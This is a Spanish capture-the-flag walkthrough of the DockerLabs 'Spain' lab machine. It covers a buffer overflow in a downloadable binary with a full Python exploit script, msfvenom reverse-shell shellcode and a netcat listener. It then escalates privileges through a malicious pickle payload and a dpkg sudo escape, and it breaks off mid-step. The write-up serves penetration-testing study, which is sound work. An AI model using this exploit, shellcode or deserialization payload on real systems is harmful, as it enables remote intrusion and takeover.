# Spain DockerLabs (Hard)

### Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip spain.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_deploy.sh spain.tar
```

Info:

```
                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____   
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__   
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___]  
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

### Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-02 03:31 EST
Nmap scan report for 172.17.0.2
Host is up (0.000035s latency).

PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 66:db:6e:23:2a:f4:01:ab:3a:41:be:a4:a7:f9:1b:d1 (ECDSA)
|_  256 f3:3e:ee:2e:bb:75:63:ad:bf:7b:1e:84:81:40:2d:92 (ED25519)
80/tcp   open  http        Apache httpd 2.4.62
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: Did not follow redirect to http://spainmerides.dl
9000/tcp open  cslistener?
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: Host: 172.17.0.2; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.80 seconds
```

Si entramos en el puerto `80` para ver la pagina web, vemos que no nos va a cargar, ya que se esta intentando conectar a un dominio en especifico llamado `spainmerides.dl`, por lo que lo añadiremos en el `hosts`:

```shell
nano /etc/hosts

#Dentro del nano
<IP>          spainmerides.dl
```

Lo guardamos y volveremos a cargar la pagina.

Vemos una pagina normal y corriente, nada fuera de lo normal, por lo que vamos a `fuzzear` un poco.

## Gobuster

```shell
gobuster dir -u http://spainmerides.dl/ -w <WORDLIST> -x html,php,txt -t 100 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://spainmerides.dl/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 280]
/.htaccess.txt        (Status: 403) [Size: 280]
/.htaccess.php        (Status: 403) [Size: 280]
/.htaccess.html       (Status: 403) [Size: 280]
/.htpasswd.html       (Status: 403) [Size: 280]
/.htpasswd.php        (Status: 403) [Size: 280]
/.htpasswd            (Status: 403) [Size: 280]
/.htpasswd.txt        (Status: 403) [Size: 280]
/index.php            (Status: 200) [Size: 776]
/manager.php          (Status: 200) [Size: 1472]
/server-status        (Status: 403) [Size: 280]
Progress: 81876 / 81880 (100.00%)
===============================================================
Finished
===============================================================
```

Vemos que nos descubre una pagina llamada `manager.php`, si entramos dentro vemos que nos pone un archivo para descargarnos llamado `bitlock`, por lo que nos lo descargaremos y probaremos a ejecutarlo a ver que nos muestra.

```shell
chmod +x bitlock
./bitlock
```

Info:

```
Esperando conexiones en el puerto 9000...
```

Por lo que vemos nos pone que esta esperando alguna conexion en el puerto `9000` por lo que vamos a probar hacer lo siguiente:

```shell
netcat 127.0.0.1 9000
```

Estando dentro de la conexion probaremos a enviar un texto:

```
AAAAAAAAAAAAAAAAAAAAA
```

Y en el binario donde estaba la escucha veremos lo siguiente cuando lo enviemos:

```
Esperando conexiones en el puerto 9000...
************************
* AAAAAAAAAAAAAAAAAAAAA
0 *
************************
zsh: segmentation fault  ./bitlock
```

Por lo que vemos se ha enviado correctamente y le ha llegado al binario, a parte de que vemos que desbordamos la memoria del `buffer` por lo que podremos hacer un `buffer Overflow`.

## Ingenieria inversa (bitlock)

### Instalacion de GDB con PEDA/GDB con pwndbg

Lo que primero tendremos que hacer sera lo siguiente:

```shell
git clone https://github.com/longld/peda.git ~/peda
echo "source ~/peda/peda.py" >> ~/.gdbinit
```

Y si iniciamos el programa con `GDB` pasandole como parametro el programa, se nos pondra el `gdb-peda`...

```shell
gdb ./bitlock
```

Pero si diera error por las versiones, podremos instalar esta otra herramienta que es mas poderosa:

```shell
git clone https://github.com/pwndbg/pwndbg
cd pwndbg
./setup.sh
```

Y si iniciamos `gdb` veremos lo siguiente:

```shell
gdb -q ./bitlock
```

Info:

```
pwndbg: loaded 176 pwndbg commands and 47 shell commands. Type pwndbg [--shell | --all] [filter] for a list.
pwndbg: created $rebase, $base, $hex2ptr, $bn_sym, $bn_var, $bn_eval, $ida GDB functions (can be used with print/break)
Reading symbols from ./bitlock...
(No debugging symbols found in ./bitlock)
------- tip of the day (disable with set show-tips off) -------
Use the killall command to kill all specified threads (via their ids)
pwndbg>
```

### Comprobacion de desbordamiento de Buffer

En el `host`, generamos una cadena de caracteres diseñada para intentar desbordar el `buffer` de la aplicación. Esto se logra con la herramienta `pattern_create.rb`:

```shell
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 400
```

Info:

```
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A
```

Este patrón se usará como entrada en la aplicación para identificar cómo se maneja el `buffer`.

Conectamos al servicio vulnerable usando `netcat`:

> Host:

```shell
netcat 127.0.0.1 20201
```

Introducimos los `400` caracteres generados previamente. Para automatizar este paso, creamos un script en `Python`:

> step1.py

Este script automatiza la conexión y el envío del patrón:

```python
#!/usr/bin/python3

import socket

target_ip = "127.0.0.1"
target_port = 9000

test_pattern = b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A"

def send_payload():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.connect((target_ip, target_port))
        sock.send(test_pattern + b"\r\n")

if __name__ == '__main__':
    send_payload()
```

Antes de ejecutar el script, inicia la aplicación en `GDB` (preferentemente con `pwndbg`):

> gdb (pwndbg)

```shell
run
```

Ahora en el `host` ejecutamos:

```shell
python3 step1.py
```

**Resultado esperado en GDB:** La aplicación debería mostrar un error de segmentación (`SIGSEGV`), indicando que el buffer fue desbordado. Observa el valor de `EIP` en los registros, que reflejará parte del patrón enviado.

Y en el `GDB` veremos algo asi:

```
Starting program: /home/kali/Desktop/spain/bitlock 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Esperando conexiones en el puerto 9000...
************************
* Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A
0 *
************************

Program received signal SIGSEGV, Segmentation fault.
0x61413761 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
───────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────────────────────────────────
 EAX  0xffffce26 ◂— 0x41306141 ('Aa0A')
 EBX  0x35614134 ('4Aa5')
 ECX  0xffffcfe0 ◂— 'm9An0An1An2A\r\n0'
 EDX  0xffffcfaa ◂— 'm9An0An1An2A\r\n0'
 EDI  0xffffd25c ◂— 0x10
 ESI  0xffffd36c —▸ 0xffffd51b ◂— 'COLORTERM=truecolor'
 EBP  0x41366141 ('Aa6A')
 ESP  0xffffce40 ◂— 0x39614138 ('8Aa9')
 EIP  0x61413761 ('a7Aa')
─────────────────────────────────────────────────────────────[ DISASM / i386 / set emulate on ]──────────────────────────────────────────────────────────────
Invalid address 0x61413761










──────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────
00:0000│ esp 0xffffce40 ◂— 0x39614138 ('8Aa9')
01:0004│     0xffffce44 ◂— 0x41306241 ('Ab0A')
02:0008│     0xffffce48 ◂— 0x62413162 ('b1Ab')
03:000c│     0xffffce4c ◂— 0x33624132 ('2Ab3')
04:0010│     0xffffce50 ◂— 0x41346241 ('Ab4A')
05:0014│     0xffffce54 ◂— 0x62413562 ('b5Ab')
06:0018│     0xffffce58 ◂— 0x37624136 ('6Ab7')
07:001c│     0xffffce5c ◂— 0x41386241 ('Ab8A')
────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────
 ► 0 0x61413761 None
   1 0x39614138 None
   2 0x41306241 None
   3 0x62413162 None
   4 0x33624132 None
   5 0x41346241 None
   6 0x62413562 None
   7 0x37624136 None
─────────────────────────────────────────────────────────────────────────────
```

Veremos que hemos conseguido pasarnos del `buffer` y nos muestra la direccion de memoria que nos importa llamado `EIP` que seria `0x61413761`.

### Identificación del Offset

Para determinar el desplazamiento exacto (`offset`) donde ocurre la `sobrescritura`, usamos `pattern_offset.rb`, proporcionando la dirección en hexadecimal obtenida en `EIP`:

> Host

```shell
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x61413761
```

Info:

```
[*] Exact match at offset 22
```

Esto indica que el `offset` es de `22` bytes, por lo que haremos lo siguiente, para automatizar todo este proceso:

> step2.py

Creamos un nuevo script que utiliza el `offset` para sobrescribir el registro `EIP` con un valor controlado (`BBBB`):

```python
#!/usr/bin/python3

import socket

target_ip = "127.0.0.1"
target_port = 9000

buffer_size = 22
padding = b"A" * buffer_size
eip_override = b"B" * 4

crafted_payload = padding + eip_override

def send_payload():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.connect((target_ip, target_port))
        sock.send(crafted_payload + b"\r\n")

if __name__ == '__main__':
    send_payload()
```

Antes, tendremos que hacer lo siguiente en `GDB` para iniciar la aplicacion:

> gdb (pwndbg)

```shell
run
```

Y ahora en el `host` ejecutaremos el script:

> host

```shell
python3 step2.py
```

**Resultado esperado en GDB:** El registro `EIP` ahora debería estar sobrescrito con `0x42424242` (`BBBB`).

Por lo que veremos lo siguiente en el `GDB`:

```
Starting program: /home/kali/Desktop/spain/bitlock 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Esperando conexiones en el puerto 9000...
************************
* AAAAAAAAAAAAAAAAAAAAAABBBB
0 *
************************

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
───────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────────────────────────────────
 EAX  0xffffce26 ◂— 'AAAAAAAAAAAAAAAAAAAAAABBBB\r\n0'
 EBX  0x41414141 ('AAAA')
 ECX  0xffffce70 ◂— 'AABBBB\r\n0'
 EDX  0xffffce3a ◂— 'AABBBB\r\n0'
 EDI  0xffffd25c ◂— 0x10
 ESI  0xffffd36c —▸ 0xffffd51b ◂— 'COLORTERM=truecolor'
 EBP  0x41414141 ('AAAA')
 ESP  0xffffce40 ◂— 0x300a0d /* '\r\n0' */
 EIP  0x42424242 ('BBBB')
─────────────────────────────────────────────────────────────[ DISASM / i386 / set emulate on ]──────────────────────────────────────────────────────────────
Invalid address 0x42424242










──────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────
00:0000│ esp 0xffffce40 ◂— 0x300a0d /* '\r\n0' */
01:0004│     0xffffce44 —▸ 0xffffce5c ◂— 'AAAAAAAAAAAAAAAAAAAAAABBBB\r\n0'
02:0008│     0xffffce48 ◂— 0x400
03:000c│     0xffffce4c —▸ 0x80492ad (main+27) ◂— add ebx, 0x2d47
04:0010│     0xffffce50 —▸ 0xf7ffda20 ◂— 0
05:0014│     0xffffce54 ◂— 0
06:0018│     0xffffce58 —▸ 0xf7fc6178 ◂— mov byte ptr [eax], al
07:001c│     0xffffce5c ◂— 'AAAAAAAAAAAAAAAAAAAAAABBBB\r\n0'
────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────
 ► 0 0x42424242 None
   1 0x300a0d None
   2 0xffffce5c None
────────────────────────────────────────────────────────────────────────────────
```

Vemos que funciona y sobrescribe con `B` el `EIP` por lo que ahora tendremos que injectar un `shellcode` para que se nos haga una `reverse shell` al servidor aprovechando esta vulnerabilidad.

### Verificación del Espacio Después del EIP

Queremos comprobar qué ocurre con los datos introducidos después del `EIP`. Para ello, añadimos datos adicionales (`CCCC`) al final del payload creando una variable `after_eip` y automatizaremos todo esto con un script:

> step3.py

```python
#!/usr/bin/python3

import socket

target_ip = "127.0.0.1"
target_port = 9000

buffer_size = 22
padding = b"A" * buffer_size
eip_override = b"B" * 4
post_eip_data = b"C" * 300

crafted_payload = padding + eip_override + post_eip_data

def send_payload():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.connect((target_ip, target_port))
        sock.send(crafted_payload + b"\r\n")

if __name__ == '__main__':
    send_payload()
```

Ahora en el `GDB` tendremos que poner de nuevo `run` para ejecutar la aplicacion:

> gdb (pwndbg)

```shell
run
```

Y en el host ejecutamos el script:

> host

```shell
python3 step3.py
```

En el `GDB` tendremos que ver algo asi:

```
Starting program: /home/kali/Desktop/spain/bitlock 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Esperando conexiones en el puerto 9000...
************************
* AAAAAAAAAAAAAAAAAAAAAABBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
0 *
************************

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
───────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────────────────────────────────
 EAX  0xffffce26 ◂— 0x41414141 ('AAAA')
 EBX  0x41414141 ('AAAA')
 ECX  0xffffcfa0 ◂— 'CC\r\n0'
 EDX  0xffffcf6a ◂— 'CC\r\n0'
 EDI  0xffffd25c ◂— 0x10
 ESI  0xffffd36c —▸ 0xffffd51b ◂— 'COLORTERM=truecolor'
 EBP  0x41414141 ('AAAA')
 ESP  0xffffce40 ◂— 0x43434343 ('CCCC')
 EIP  0x42424242 ('BBBB')
─────────────────────────────────────────────────────────────[ DISASM / i386 / set emulate on ]──────────────────────────────────────────────────────────────
Invalid address 0x42424242










──────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────
00:0000│ esp 0xffffce40 ◂— 0x43434343 ('CCCC')
... ↓        7 skipped
────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────
 ► 0 0x42424242 None
   1 0x43434343 None
   2 0x43434343 None
   3 0x43434343 None
   4 0x43434343 None
   5 0x43434343 None
   6 0x43434343 None
   7 0x43434343 None
──────────────────────────────────────────────────────────────────────────
```

**Resultado esperado:** En GDB, verifica la pila (`stack`) para comprobar que los `CCCC` aparecen después del `EIP`. Usa este comando (`x/300wx $esp`)

Si ejecutamos `x/300wx $esp` para ver la información que hay en el pila vemos que nuestras `Cs` se están introduciendo al principio de la pila (`stack`), por lo que en este punto lo que debemos hacer es encontrar un `OpCode` el cual nos permita realizar un salto al `ESP`, es decir al principio de la pila.

```shell
x/300wx $esp
```

Info:

```
0xffffce40:     0x43434343      0x43434343      0x43434343      0x43434343
0xffffce50:     0x43434343      0x43434343      0x43434343      0x43434343
0xffffce60:     0x43434343      0x43434343      0x43434343      0x43434343
0xffffce70:     0x43434343      0x43434343      0x43434343      0x43434343
0xffffce80:     0x43434343      0x43434343      0x43434343      0x43434343
0xffffce90:     0x43434343      0x43434343      0x43434343      0x43434343
0xffffcea0:     0x43434343      0x43434343      0x43434343      0x43434343
0xffffceb0:     0x43434343      0x43434343      0x43434343      0x43434343
0xffffcec0:     0x43434343      0x43434343      0x43434343      0x43434343
0xffffced0:     0x43434343      0x43434343      0x43434343      0x43434343
0xffffcee0:     0x43434343      0x43434343      0x43434343      0x43434343
0xffffcef0:     0x43434343      0x43434343      0x43434343      0x43434343
0xffffcf00:     0x43434343      0x43434343      0x43434343      0x43434343
0xffffcf10:     0x43434343      0x43434343      0x43434343      0x43434343
0xffffcf20:     0x43434343      0x43434343      0x43434343      0x43434343
0xffffcf30:     0x43434343      0x43434343      0x43434343      0x43434343
0xffffcf40:     0x43434343      0x43434343      0x43434343      0x43434343
0xffffcf50:     0x43434343      0x43434343      0x43434343      0x43434343
0xffffcf60:     0x43434343      0x43434343      0x43434343      0x00300a0d
0xffffcf70:     0x43434343      0x43434343      0x43434343      0x43434343
0xffffcf80:     0x43434343      0x43434343      0x43434343      0x43434343
0xffffcf90:     0x43434343      0x43434343      0x43434343      0x43434343
```

Vemos que se esta realizando todo correctamente al principio de la pila y llenando esos huecos con la `C` que se corresponden con `0x43434343`.

### Identificación del OpCode para JMP ESP

Para redirigir la ejecución al principio de la pila (`ESP`), necesitamos identificar el código de operación (`opcode`) de un salto (`JMP ESP`). Usamos `nasm_shell.rb`:

```shell
/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
```

Nos metera en una shell interactiva de la herramienta:

```
nasm >
```

Y ejecutamos lo siguiente:

```
jmp esp
```

Info:

```
00000000  FFE4              jmp esp
```

Esto indica que el opcode para `JMP ESP` es `FFE4`.

Ahora usaremos `objdump` para saber cual es la dirección de memoria la cual nos permite realizar el `JMP ESP`

```shell
objdump -d bitlock | grep "FF E4" -i
```

Info:

```
804948b:       ff e4                   jmp    *%esp
```

Y veremos que la direccion de memoria es `0x0804948b`.

### Generar un Shellcode (Reverse Shell)

Ahora generaremos un `shellcode` con `msfvenom` de la siguiente forma:

```shell
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -b '\x00\x0a\x0d' -f py
```

El flag `-b '\x00\x0a\x0d'` excluye los caracteres nulos y de salto de línea, ya que podrían interrumpir la ejecución del payload. El flag `-f py` genera el código en formato Python para facilitar su inclusión en scripts.

Info:

```
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 95 (iteration=0)
x86/shikata_ga_nai chosen with final size 95
Payload size: 95 bytes
Final size of py file: 479 bytes
buf =  b""
buf += b"\xdb\xcb\xd9\x74\x24\xf4\xbf\x8e\x4f\x16\x01\x58"
buf += b"\x2b\xc9\xb1\x12\x83\xc0\x04\x31\x78\x13\x03\xf6"
buf += b"\x5c\xf4\xf4\x37\xb8\x0f\x15\x64\x7d\xa3\xb0\x88"
buf += b"\x08\xa2\xf5\xea\xc7\xa5\x65\xab\x67\x9a\x44\xcb"
buf += b"\xc1\x9c\xaf\xa3\x11\xf6\x55\x89\xfa\x05\x56\xf3"
buf += b"\x9b\x80\xb7\xbb\x3a\xc3\x66\xe8\x71\xe0\x01\xef"
buf += b"\xbb\x67\x43\x87\x2d\x47\x17\x3f\xda\xb8\xf8\xdd"
buf += b"\x73\x4e\xe5\x73\xd7\xd9\x0b\xc3\xdc\x14\x4b"
```

### Obtener una shell como el usuario securedev

Por lo que crearemos un script para automatizar todo esto y tambien añadiremos en el script una cadena de `NOPS` para que salte todo hasta nuestro `shellcode` y se ejecute nuestra `rever shell`.

> step4.py

```python
#!/usr/bin/python3

import socket
from struct import pack

target_ip = "<IP>"
target_port = 9000

buffer_size = 22
padding = b"A" * buffer_size
jmp_esp_address = pack("<L", 0x0804948b)  # Dirección de JMP ESP obtenida con análisis previo.
nop_sled = b'\x90' * 32  # Pista de NOPs para mayor tolerancia.

# Shellcode personalizado para reverse shell
buf =  b""
buf += b"\xdb\xcb\xd9\x74\x24\xf4\xbf\x8e\x4f\x16\x01\x58"
buf += b"\x2b\xc9\xb1\x12\x83\xc0\x04\x31\x78\x13\x03\xf6"
buf += b"\x5c\xf4\xf4\x37\xb8\x0f\x15\x64\x7d\xa3\xb0\x88"
buf += b"\x08\xa2\xf5\xea\xc7\xa5\x65\xab\x67\x9a\x44\xcb"
buf += b"\xc1\x9c\xaf\xa3\x11\xf6\x55\x89\xfa\x05\x56\xf3"
buf += b"\x9b\x80\xb7\xbb\x3a\xc3\x66\xe8\x71\xe0\x01\xef"
buf += b"\xbb\x67\x43\x87\x2d\x47\x17\x3f\xda\xb8\xf8\xdd"
buf += b"\x73\x4e\xe5\x73\xd7\xd9\x0b\xc3\xdc\x14\x4b"

crafted_payload = padding + jmp_esp_address + nop_sled + buf

def send_payload():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.connect((target_ip, target_port))
        sock.send(crafted_payload + b"\r\n")

if __name__ == '__main__':
    send_payload()
```

**Desbordamiento del buffer**: El payload comienza con `A`'s para llenar el buffer hasta alcanzar el `offset` donde se sobrescribe el `EIP` (`22` en este caso).

**Dirección de retorno**: Utilizamos la dirección de una instrucción `jmp esp` para redirigir la ejecución hacia nuestro `shellcode`. Esta dirección se obtiene mediante análisis del binario vulnerable usando herramientas como `gdb`.

**NOP sled**: Se añade una "`pista`" de `NOPs` (`\x90`) antes del `shellcode` para garantizar que cualquier variación en la dirección de salto no interfiera con la ejecución del `payload`.

Por lo que ahora tendremos que hacer lo siguiente:

> gdb (pwndbg)

```shell
run
```

> host

```shell
nc -lvnp <PORT>
```

Y finalmente en otra terminal de nuestro `host` tendremos que ejecutar el script y asi obtender la shell:

```shell
python3 step4.py
```

Y si nos vamos a la escucha veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [192.168.5.186] from (UNKNOWN) [172.17.0.2] 39542
whoami
www-data
```

## Escalate user maci

Primero sanitizaremos la shell (TTY):

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for www-data on dockerlabs:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User www-data may run the following commands on dockerlabs:
    (maci) NOPASSWD: /bin/python3 /home/maci/.time_seri/time.py
```

Vemos que podemos ejecutar el script `time.py` como el usuario `maci`, por lo que veremos que contiene dicho script:

```python
```

Vemos que hay un archivo de configuracion el cual permite o no la `deserializacion` por lo que nos iremos aqui:

```shell
cd /home/maci/.time_seri
```

Dentro de esta carpeta veremos que el siguiente archivo tiene permisos de escritura, por lo que podremos modificarle:

```
-rw-r--rw- 1 maci maci   11 Dec 25 17:12 time.conf
```

Cambiaremos el `off` por el `on` para que asi se active y no nos de error el script:

```
serial=on
```

Ahora ejecutamos el script:

```shell
sudo -u maci python3 /home/maci/.time_seri/time.py
```

Info:

```
Datos deserializados correctamente, puedes revisar /tmp
```

Ahora si leemos el archivo que se nos ha creado en el `/tmp` veremos lo siguiente:

```shell
cat /tmp/.data2.log
```

Info:

```
hola maci, es darksblack recuerda terminar la maquina antes que finalice el mes
```

Por lo que vemos esta ejecutando el `data.pk1` serializado, por lo que nosotros podremos serializar un `/bin/bash` para obtener la shell del usuario `maci`.

```shell
cd /tmp
nano data.py

#Dentro del nano
import pickle
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ('/bin/bash',))

# Ruta al archivo que deseas sobrescribir
file_path = '/opt/data.pk1'

# Verificar si el archivo es escribible
if os.access(file_path, os.W_OK):
    with open(file_path, 'wb') as f:
        # Generar el payload y sobrescribir el archivo
        pickle.dump(Exploit(), f)
    print(f"El archivo {file_path} ha sido sobrescrito con el payload.")
else:
    print(f"No tienes permisos para sobrescribir el archivo {file_path}.")
```

Lo guardamos y lo ejecutamos:

```shell
python3 data.py
```

Info:

```
El archivo /opt/data.pk1 ha sido sobrescrito con el payload.
```

Ahora si ejeuctamos lo siguiente:

```shell
sudo -u maci python3 /home/maci/.time_seri/time.py
```

Con esto ya seremos el usuario `maci`.

## Escalate user darksblack

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for maci on dockerlabs:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User maci may run the following commands on dockerlabs:
    (darksblack) NOPASSWD: /usr/bin/dpkg
```

Por lo que vemos podemos ejecutar el binario `dpkg` como el usuario `darksblack`, por lo que haremos lo siguiente:

```shell
sudo -u darksblack dpkg -l
!bash
```

Y con esto ya seremos el usuario `darksblack`.

## Escalate Privileges

Si intentamos exportar el `PATH` correcto ya que no lo tiene correcto para que podamos ejecutar nuestros binarios con normalidad, nos pondra esto:

```shell
export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games
```

Info:

```
no tan rapido campeon!
```

Por lo que tendremos que utilizar rutas absolutas, vamos a listar la `/home` del usuario:

```shell
/bin/ls -la
```

Info:

```
total 52
drwxr-x--- 1 darksblack darksblack  4096 Jan  1 09:02 .
drwxr-xr-x 1 root       root        4096 Dec 26 00:21 ..
lrwxrwxrwx 1 root       root           9 Dec 26 00:32 .bash_history -> /dev/null
-rw-r--r-- 1 root       root         220 Mar 29  2024 .bash_logout
-rw-r--r-- 1 root       root        3613 Jan  1 07:45 .bashrc
-rw-r--r-- 1 root       root         807 Mar 29  2024 .profile
-rw------- 1 darksblack darksblack   726 Jan  1 07:38 .viminfo
drwxr-xr-x 2 darksblack darksblack  4096 Jan  1 08:57 .zprofile
-rwxr-xr-x 1 darksblack darksblack 15048 Jan  1 09:02 Olympus
drwxr-x--- 1 darksblack darksblack  4096 Jan  1 07:41 bin
```

Vemos que hay un archivo interesante llamado `Olympus` vamos a probar a ejecutarlo:

```shell
./Olympus
```

Info:

```
Selecciona el modo:
1. Invitado
2. Administrador
2
Introduce el serial: a
